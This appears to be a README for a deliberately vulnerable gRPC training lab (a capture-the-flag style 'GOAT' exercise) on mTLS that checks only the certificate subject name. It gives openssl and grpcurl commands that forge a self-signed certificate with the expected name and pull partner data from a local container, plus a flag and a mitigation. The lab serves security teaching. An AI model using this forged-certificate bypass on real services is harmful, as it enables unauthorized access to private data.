# Lab 005: mTLS with Subject Validation

## Vulnerability
Partner API validates client certificate subject name but accepts any certificate with "goatpartner.local".

## Objective
Generate a fake client certificate with the correct subject name "goatpartner.local" to access partner data.

## Run the Lab
```bash
# Build and run
docker build -t grpc-005 .
docker run -p 8005:8005 grpc-005
```

## Exploit

### Step 1: Generate a client certificate with the required subject name
```bash
# Generate client private key
openssl genrsa -out client.key 2048

# Generate client certificate with the EXACT subject name required
openssl req -new -key client.key -out client.csr -subj "/CN=goatpartner.local/O=AttackerCorp"

# Generate self-signed client certificate
openssl x509 -req -in client.csr -signkey client.key -out client.crt -days 365
```

### Step 2: Use the certificate to access partner data
```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Connect using the client certificate with correct subject name
grpcurl -insecure -cert client.crt -key client.key -d '{
  "partner_id": "GOAT_PARTNER",
  "data_type": "all"
}' localhost:8005 partner.PartnerAPI/GetPartnerData
```

## Impact
Attackers can generate certificates with the required subject name and bypass partner authentication.

## Flag
Successfully access partner data to get: `GRPC_GOAT{subject_validation_insufficient_for_mtls}`

## Mitigation
Use proper CA-signed certificates with certificate pinning, not just subject name validation.